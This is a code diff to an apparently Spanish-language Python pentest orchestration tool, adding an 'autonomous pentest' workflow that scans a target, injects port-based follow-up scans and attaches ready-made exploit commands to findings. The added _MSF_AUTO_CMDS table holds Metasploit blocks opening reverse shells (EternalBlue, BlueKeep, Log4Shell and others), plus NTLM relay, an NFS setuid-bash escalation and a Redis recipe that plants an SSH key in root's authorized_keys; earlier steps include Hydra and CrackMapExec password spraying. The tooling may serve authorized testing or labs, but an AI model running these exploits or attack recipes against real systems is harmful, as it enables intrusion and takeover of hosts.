@@ -104,9 +104,9 @@ WORKFLOWS = [
         "icon": "fa-radar",
         "color": "blue",
         "steps": [
-            {"name": "Nmap Quick (top 1000)", "command": "nmap -sV --open --top-ports 1000 {rhost}", "parse": "nmap"},
-            {"name": "Nmap Full TCP", "command": "nmap -sC -sV -p- --min-rate 3000 {rhost} -oN /tmp/nmap_full_{rhost}.txt", "parse": "nmap"},
-            {"name": "Nmap UDP Top-20", "command": "nmap -sU --top-ports 20 {rhost}", "parse": "nmap"},
+            {"name": "Nmap Quick (top 1000)", "command": "nmap -T4 -sV --open --top-ports 1000 {rhost}", "parse": "nmap"},
+            {"name": "Nmap Full TCP", "command": "nmap -T4 -sC -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m {rhost} -oN /tmp/nmap_full_{rhost}.txt", "parse": "nmap"},
+            {"name": "Nmap UDP Top-20", "command": "nmap -T4 -sU --top-ports 20 --max-retries 1 {rhost}", "parse": "nmap"},
         ],
     },
     {
@@ -172,6 +172,26 @@ WORKFLOWS = [
             {"name": "Hydra SSH", "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt {rhost} ssh -t 4 2>/dev/null"},
             {"name": "Hydra FTP", "command": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt {rhost} ftp -t 4 2>/dev/null"},
             {"name": "CrackMapExec SMB spray", "command": "crackmapexec smb {rhost} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt --no-bruteforce 2>/dev/null"},
+        ],
+    },
+    {
+        "id": "autonomous_pentest",
+        "name": "Pentest Autónomo",
+        "description": "Recon + vuln scripts + nuclei con inyección dinámica de pasos y auto-save de findings.",
+        "icon": "fa-robot",
+        "color": "violet",
+        "auto_inject": True,
+        "steps": [
+            {
+                "name": "Nmap Discovery + Vuln Scripts",
+                "command": "nmap -T4 -sV --open --top-ports 1000 --script=vuln,auth,default {rhost}",
+                "parse": "nmap",
+            },
+            {
+                "name": "Nmap Full TCP",
+                "command": "nmap -T4 -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m {rhost} -oN /tmp/nmap_full_{rhost}.txt",
+                "parse": "nmap",
+            },
         ],
     },
 ]
@@ -477,7 +497,14 @@ def run_workflow():
     wf_run_id = str(uuid.uuid4())
 
     def _run_wf():
-        for step in workflow["steps"]:
+        steps = list(workflow["steps"])   # mutable — auto_inject can append
+        injected = set()
+        rhost_val = vars_dict.get("rhost", "")
+        i = 0
+        while i < len(steps):
+            step = steps[i]
+            i += 1
+
             cmd = step["command"]
             for k, v in vars_dict.items():
                 cmd = cmd.replace(f"{{{k}}}", v)
@@ -524,6 +551,54 @@ def run_workflow():
             finally:
                 job["finished_at"] = datetime.now().isoformat()
                 job.pop("proc", None)
+
+            # ── Auto-parse output and save findings + ports to project ──────
+            if step.get("parse") and project_id:
+                output_text = "\n".join(job["output"])
+                try:
+                    parsed = _parse_tool_output(step["parse"], output_text, rhost_val)
+                except Exception:
+                    parsed = None
+
+                if parsed and (parsed.get("findings") or parsed.get("open_ports")):
+                    try:
+                        proj = read_project(project_id)
+                        if proj:
+                            existing_titles = {f["title"] for f in proj.get("findings", [])}
+                            for f in parsed["findings"]:
+                                if f["title"] not in existing_titles:
+                                    _auto_mitre_tag(f)
+                                    _attach_msf_command(f, rhost_val, vars_dict)
+                                    proj.setdefault("findings", []).append(f)
+                                    existing_titles.add(f["title"])
+
+                            existing_ports = {
+                                (p.get("port"), p.get("proto"))
+                                for p in proj.get("port_map", [])
+                            }
+                            for p in parsed.get("open_ports", []):
+                                key = (p["port"], p["proto"])
+                                if key not in existing_ports:
+                                    proj.setdefault("port_map", []).append({
+                                        "host": rhost_val,
+                                        "port": p["port"],
+                                        "proto": p["proto"],
+                                        "service": p["service"],
+                                        "version": p.get("version", ""),
+                                        "added_by": "auto-recon",
+                                    })
+                                    existing_ports.add(key)
+                            write_project(proj)
+                    except Exception:
+                        pass
+
+                # ── Dynamic step injection (autonomous_pentest only) ────────
+                if workflow.get("auto_inject") and parsed and parsed.get("open_ports"):
+                    try:
+                        port_nums = {p["port"] for p in parsed["open_ports"]}
+                        _inject_followup_steps(steps, injected, port_nums, rhost_val)
+                    except Exception:
+                        pass
 
     threading.Thread(target=_run_wf, daemon=True).start()
     return jsonify({"workflow_run_id": wf_run_id}), 202
@@ -789,6 +864,182 @@ def _auto_mitre_tag(finding):
                 finding['mitre_name'] = technique_name
             break
     return finding
+
+# ── MSF auto-command templates ─────────────────────────────────────────────
+# pattern (against title+desc+cve) -> msfconsole command block template
+_MSF_AUTO_CMDS = [
+    (r'ms17-010|eternalblue|cve-2017-014[34]',
+     "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'ms08-067|cve-2008-4250',
+     "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS {rhost}\nset PAYLOAD windows/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'vsftpd.*backdoor|vsftpd 2\.3\.4',
+     "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {rhost}\nrun"),
+    (r'samba.*usermap|cve-2007-2447',
+     "use exploit/multi/samba/usermap_script\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'bluekeep|cve-2019-0708',
+     "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'apache.*2\.4\.4[89]|cve-2021-4177[23]|path traversal.*rce',
+     "use exploit/multi/http/apache_normalize_path_rce\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'drupalgeddon|cve-2018-7600',
+     "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {rhost}\nset PAYLOAD php/reverse_php\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'log4shell|cve-2021-44228',
+     "use exploit/multi/misc/log4shell_header_injection\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'distcc.*rce|cve-2004-2687',
+     "use exploit/unix/misc/distcc_exec\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'unrealircd.*backdoor',
+     "use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'tomcat.*cred|tomcat.*manager',
+     "use exploit/multi/http/tomcat_mgr_upload\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'heartbleed|cve-2014-0160',
+     "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {rhost}\nset ACTION DUMP\nrun"),
+    (r'jboss.*invoke|cve-2010-0738',
+     "use exploit/multi/http/jboss_invoke_deploy\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'smb.*signing.*deshabilitado|smb signing disabled',
+     "# NTLM Relay:\nresponder -I eth0 -rdwv &\nntlmrelayx.py -tf /tmp/targets.txt -smb2support"),
+    (r'nfs.*no_root_squash',
+     "# NFS no_root_squash:\nmount -t nfs {rhost}:/share /mnt/nfs\ncp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash\n# En el target: /mnt/nfs/bash -p"),
+    (r'redis.*sin autenticaci|redis.*no.auth',
+     "# Redis RCE via SSH keys:\nredis-cli -h {rhost} config set dir /root/.ssh/\nredis-cli -h {rhost} config set dbfilename authorized_keys\nredis-cli -h {rhost} set key \"$(cat ~/.ssh/id_rsa.pub)\"\nredis-cli -h {rhost} save"),
+    (r'spring4shell|cve-2022-22965',
+     "use exploit/multi/http/spring_framework_rce_spring4shell\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'confluence.*ognl|cve-2022-26134',
+     "use exploit/multi/http/confluence_namespace_ognl_injection\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'webmin.*backdoor|cve-2019-15107',
+     "use exploit/linux/http/webmin_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+    (r'smb.*ghost|cve-2020-0796',
+     "use exploit/windows/smb/cve_2020_0796_smbghost\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
+]
+
+
+def _attach_msf_command(finding, rhost, vars_dict):
+    """Attach auto-generated exploit command to a finding when a known module matches."""
+    text = f"{finding.get('title','')} {finding.get('description','')} {finding.get('cve','')}".lower()
+    lhost = vars_dict.get("lhost", "YOUR_LHOST")
+    lport = vars_dict.get("lport", "4444")
+    for pattern, cmd_tpl in _MSF_AUTO_CMDS:
+        if re.search(pattern, text, re.IGNORECASE):
+            finding["exploit_cmd"] = (
+                cmd_tpl
+                .replace("{rhost}", rhost)
+                .replace("{lhost}", lhost)
+                .replace("{lport}", lport)
+            )
+            break
+
+
+def _inject_followup_steps(steps, injected, port_nums, rhost):
+    """Dynamically append follow-up scan steps based on discovered ports."""
+    if (port_nums & {80, 443, 8080, 8443, 8000, 8888}) and "nuclei_web" not in injected:
+        steps.append({
+            "name": "[Auto] Nuclei Web Vuln Scan",
+            "command": (
+                f"nuclei -u http://{rhost} https://{rhost} "
+                f"-t /root/nuclei-templates/ "
+                f"-severity critical,high,medium -silent -j 2>/dev/null || "
+                f"nuclei -u http://{rhost} -severity critical,high,medium -silent -j 2>/dev/null"
+            ),
+            "parse": "nuclei",
+        })
+        steps.append({
+            "name": "[Auto] HTTP Vuln Scripts",
+            "command": (
+                f"nmap -T4 -p 80,443,8080,8443 "
+                f"--script=http-shellshock,http-phpmyadmin-dir-traversal,"
+                f"http-vuln-cve2017-5638,http-auth-finder,http-backup-finder,"
+                f"http-git,http-config-backup {rhost}"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("nuclei_web")
+
+    if (port_nums & {445, 139}) and "smb_vuln" not in injected:
+        steps.append({
+            "name": "[Auto] SMB Vuln Check (MS17-010/MS08-067/Signing)",
+            "command": (
+                f"nmap -T4 -p 445,139 "
+                f"--script=smb-vuln-ms17-010,smb-vuln-ms08-067,"
+                f"smb-vuln-cve2009-3103,smb-security-mode,smb2-security-mode {rhost}"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("smb_vuln")
+
+    if 22 in port_nums and "ssh_vuln" not in injected:
+        steps.append({
+            "name": "[Auto] SSH Audit",
+            "command": f"nmap -T4 -p 22 --script=ssh-auth-methods,ssh2-enum-algos,sshv1 {rhost}",
+            "parse": "nmap",
+        })
+        injected.add("ssh_vuln")
+
+    if 3389 in port_nums and "rdp_vuln" not in injected:
+        steps.append({
+            "name": "[Auto] RDP BlueKeep Check",
+            "command": f"nmap -T4 -p 3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption {rhost}",
+            "parse": "nmap",
+        })
+        injected.add("rdp_vuln")
+
+    if 3306 in port_nums and "mysql_check" not in injected:
+        steps.append({
+            "name": "[Auto] MySQL Empty Password",
+            "command": f"nmap -T4 -p 3306 --script=mysql-empty-password,mysql-databases,mysql-info {rhost}",
+            "parse": "nmap",
+        })
+        injected.add("mysql_check")
+
+    if 6379 in port_nums and "redis_check" not in injected:
+        steps.append({
+            "name": "[Auto] Redis No-Auth Check",
+            "command": (
+                f"redis-cli -h {rhost} ping 2>/dev/null && echo 'REDIS_NO_AUTH_CONFIRMED' "
+                f"|| echo 'Redis requires authentication'"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("redis_check")
+
+    if 21 in port_nums and "ftp_check" not in injected:
+        steps.append({
+            "name": "[Auto] FTP Anonymous + Backdoor",
+            "command": f"nmap -T4 -p 21 --script=ftp-anon,ftp-vsftpd-backdoor,ftp-proftpd-backdoor {rhost}",
+            "parse": "nmap",
+        })
+        injected.add("ftp_check")
+
+    if 2049 in port_nums and "nfs_check" not in injected:
+        steps.append({
+            "name": "[Auto] NFS Shares",
+            "command": (
+                f"nmap -T4 -p 2049 --script=nfs-showmount,nfs-ls,nfs-statfs {rhost} 2>/dev/null; "
+                f"showmount -e {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("nfs_check")
+
+    if 161 in port_nums and "snmp_check" not in injected:
+        steps.append({
+            "name": "[Auto] SNMP Community Check",
+            "command": (
+                f"onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {rhost} 2>/dev/null; "
+                f"snmpwalk -v2c -c public {rhost} 2>/dev/null | head -50"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("snmp_check")
+
+    if (port_nums & {1433, 5432}) and "sql_check" not in injected:
+        steps.append({
+            "name": "[Auto] MSSQL/PostgreSQL Auth Check",
+            "command": (
+                f"nmap -T4 -p 1433,5432 "
+                f"--script=ms-sql-empty-password,ms-sql-info,pgsql-brute {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("sql_check")
+
 
 def _parse_tool_output(tool, output_text, rhost=""):
     loot      = []
@@ -6118,6 +6369,16 @@ GVM_ALL_TCP_PORT_LIST = "33d0cd82-57c6-11e1-8ed1-406186ea4fc5"
 
 def _gvm_exec(socket_path, gmp_user, gmp_pass, xml_query, timeout=60):
     """Run a GMP XML query via gvm-cli socket and return parsed ElementTree root."""
+    import os as _os
+    if not _os.path.exists(socket_path):
+        raise ValueError(
+            f"GVM socket no encontrado en '{socket_path}'. "
+            "Comprueba que gvmd está corriendo: 'sudo systemctl status gvmd'"
+        )
+
+    env = os.environ.copy()
+    env["PYTHONWARNINGS"] = "ignore"
+
     cmd = [
         "gvm-cli", "socket",
         "--socketpath", socket_path,
@@ -6126,10 +6387,21 @@ def _gvm_exec(socket_path, gmp_user, gmp_pass, xml_query, timeout=60):
         "--xml", xml_query,
     ]
     try:
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=env)
         xml_out = result.stdout.strip()
         if not xml_out:
-            raise ValueError(f"gvm-cli returned no output. stderr: {result.stderr[:300]}")
+            # Filtra DeprecationWarnings de Python del stderr para mostrar el error real
+            real_stderr = "\n".join(
+                line for line in result.stderr.splitlines()
+                if "DeprecationWarning" not in line
+                and "CryptographyDeprecationWarning" not in line
+                and "has been moved to" not in line
+                and "will be removed from" not in line
+                and "cipher" not in line.lower()
+                and "paramiko" not in line
+            ).strip()
+            detail = real_stderr or result.stderr[:500] or "(sin output)"
+            raise ValueError(f"gvm-cli no devolvió XML. Posible causa: {detail}")
         return ET.fromstring(xml_out)
     except subprocess.TimeoutExpired:
         raise TimeoutError(f"gvm-cli timeout after {timeout}s")
